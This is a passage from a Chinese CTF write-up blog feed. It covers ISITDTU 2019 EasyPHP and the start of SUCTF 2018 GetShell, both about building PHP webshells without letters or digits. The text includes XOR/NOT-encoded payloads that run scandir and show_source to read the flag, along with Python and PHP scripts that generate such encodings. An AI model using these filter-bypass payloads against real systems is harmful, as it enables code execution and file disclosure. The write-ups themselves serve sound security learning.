punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><blockquote><p>count_chars(string,3) è¿”å›ä¸€ä¸ªå»é‡çš„å­—ç¬¦ä¸²(æ‰€æœ‰ä½¿ç”¨è¿‡çš„ä¸åŒçš„å­—ç¬¦)</p></blockquote><p>è¦æ±‚æ‰€ç”¨å­—ç¬¦å°äº13ç§ï¼Œè¿˜æ£€æµ‹å„ç§å­—ç¬¦ã€‚</p><p>æ˜æ˜¾ï¼Œå°±æ˜¯æ— å­—æ¯æ•°å­—webshellçš„æ„é€ ã€‚</p><p>å…ˆæµ‹è¯•ä¸‹phpinfo()</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;(~%8F%97%8F%96%91%99%90)();æˆ–?_&#x3D;(%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815190330822.png"></p><p>å‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªå‡½æ•°éƒ½è¢«ç¦ç”¨äº†ï¼Œå°±å¾—æƒ³å…¶ä»–åŠæ³•ã€‚</p><p>å¯ä»¥æ„é€ </p><pre class="line-numbers language-none"><code class="language-none">print_r(scandir(.));%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d(%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d(%ff^%d1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†é—®é¢˜åœ¨äºï¼Œé™åˆ¶äº†13ä¸ªå­—ç¬¦ï¼Œé™¤å»å¿…è¦çš„<code>()^;</code>ï¼Œåªå‰©ä¸‹9ä¸ªå­—ç¬¦äº†ã€‚</p><p>æ–¹ä¾¿åç»­ä½¿ç”¨æ–¹ä¾¿ï¼Œè¿˜æ˜¯å†™ä¸ªè„šæœ¬å§</p><p>å§‘ä¸”å†™äº†ä¸ªæš´åŠ›ç”Ÿæˆçš„ï¼Œä½†è¦è·‘å¾ˆä¹…çš„ä»£ç ï¼Œæ— å¥ˆæ”¾å¼ƒã€‚</p><p>çªç„¶å‘ç°ï¼Œåœ¨è¿™é‡Œç»Ÿè®¡çš„å­—ç¬¦ä¸²å¹¶éurlcodeçš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚<code>#</code>å¯¹åº”<code>%23</code>ï¼Œä¼ è¿‡å»ç»Ÿè®¡çš„æ˜¯<code>#</code>ï¼Œä¹‹å‰æé”™äº†ï¼Œä»£ç æ€ä¹ˆå†™éƒ½ä¸å¯¹ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œæ— è¯­äº†ã€‚</p><p>é‚£æ¢ç§æ€è·¯ï¼Œå› ä¸ºé™åˆ¶ç§ç±»æ•°ä¸é™åˆ¶é•¿åº¦ï¼Œå°è¯•æœ‰æ²¡æœ‰å“ªä¸ªå­—ç¬¦å¯ä»¥é€šè¿‡å…¶ä»–å­—ç¬¦è¿›è¡Œå¤šæ¬¡å¼‚æˆ–å¾—åˆ°ï¼Œè¿™æ ·çš„è¯å°±å¥½åŠäº†ï¼Œç™¾åº¦äº†ä¸‹è„šæœ¬æ”¹äº†æ”¹ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">en</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'printrscandir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> p<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> p<span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> p<span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> k <span class="token keyword">or</span> j <span class="token operator">==</span> m <span class="token keyword">or</span> m <span class="token operator">==</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j <span class="token operator">+</span> <span class="token string">'^'</span> <span class="token operator">+</span> k <span class="token operator">+</span> <span class="token string">'^'</span><span class="token operator">+</span>m<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>                            <span class="token string">'&#123;:0>2&#125;  =>  ["&#123;:0>2&#125;","&#123;:0>2&#125;","&#123;:0>2&#125;"]'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                                en<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815235405221.png"></p><p>æŒ‘äº›å‡ºç°æ¬¡æ•°è¾ƒå°‘çš„å­—ç¬¦æ›¿æ¢ä¸€ä¸‹ï¼Œæ¯”å¦‚</p><p>åŸæ¥æ˜¯tï¼Œæˆ‘é€‰<code>t==s^d^c     %8b  =&gt;  %8c  %9b  %9c</code></p><pre class="line-numbers language-none"><code class="language-none">(%8b)^(%ff)å˜æˆ(%8c)^(%ff)^(%9b)^(9c)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŠè‡ªåŠ¨æ›¿æ¢è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tail</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ff'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> p<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">head</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>i    <span class="token keyword">return</span> ss <span class="token operator">=</span> <span class="token string">'(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)'</span>l <span class="token operator">=</span> head<span class="token punctuation">(</span>s<span class="token punctuation">)</span>p <span class="token operator">=</span> tail<span class="token punctuation">(</span>s<span class="token punctuation">)</span>to_fix_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'8b'</span><span class="token punctuation">,</span> <span class="token string">'91'</span><span class="token punctuation">,</span> <span class="token string">'8d'</span><span class="token punctuation">]</span>to_replace <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"8c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"96"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"9e"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"8f"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">for</span> t<span class="token punctuation">,</span> to_fix <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>to_fix_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> to_fix <span class="token operator">==</span> i<span class="token punctuation">:</span>            s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_fix<span class="token punctuation">,</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;^(&#123;&#125;)^(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºä¸ºä»€ä¹ˆè¦ç”¨ä¸‰ä¸ªå­—ç¬¦å¼‚æˆ–ï¼Œå› ä¸ºä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å‡ºæ¥çš„ç»“æœå¾ˆå°‘ç”šè‡³æ²¡æœ‰ã€‚</p><pre class="line-numbers language-none"><code class="language-none">print_r&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¯»ç›®å½•payload</p><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815225505661.png"></p><p>è¯»flagï¼Œç”¨<code>end()</code>ä»£æ›¿æ•°ç»„é€‰æ‹©ã€‚</p><pre class="line-numbers language-none"><code class="language-none">show_source(end(scandir(.)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SUCTF 2018]GetShell</title>
      <link href="/p/1142081591.html"/>
      <url>/p/1142081591.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[æ— å­—æ¯æ•°å­—webshell]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814171538120.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814171625633.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å¼€å±€index.php?act=upload</p><p>è¿˜ç»™å‡ºæºç ï¼Œå…ˆè¯•è¯•æ–‡ä»¶åŒ…å«ã€‚</p><p>ä¸å¤ªè¡Œã€‚</p><p>éšä¾¿ä¸Šä¼ äº†ä¸ªç©ºjpgæ–‡ä»¶ï¼Œç›´æ¥å˜æˆphpï¼Œå¥½æ´»</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814180946756.png"></p><p>åŸºæœ¬æŠŠæ•°å­—ï¼Œå­—æ¯å…¨è¿‡æ»¤äº†ï¼Œ<code>|^%</code>ä¹Ÿè¿‡æ»¤äº†</p><p>è¯•äº†ä¸‹<code>()~</code>æ²¡è¢«è¿‡æ»¤ï¼Œä½†<code>%</code>è¢«è¿‡æ»¤äº†å°±æ²¡æ³•ç”¨å¹³æ—¶ç”¨çš„é‚£ç§åŠæ³•äº†ã€‚</p><p>å’‹åŠå‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨ä¸­æ–‡ã€‚</p><p>å…ˆæ„é€ å‡º<code>1</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">==</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token comment">//$__ç­‰äº$__,è¿”å›Trueåˆ™$____ä¸º1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç”Ÿæˆä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//ç”¨äºç”Ÿæˆæ— å­—æ¯æ•°å­—webshell</span><span class="token comment">//echo ~('åŒ—')[1] =>s</span><span class="token comment">//ç”¨æ³•?a=xxxx</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ 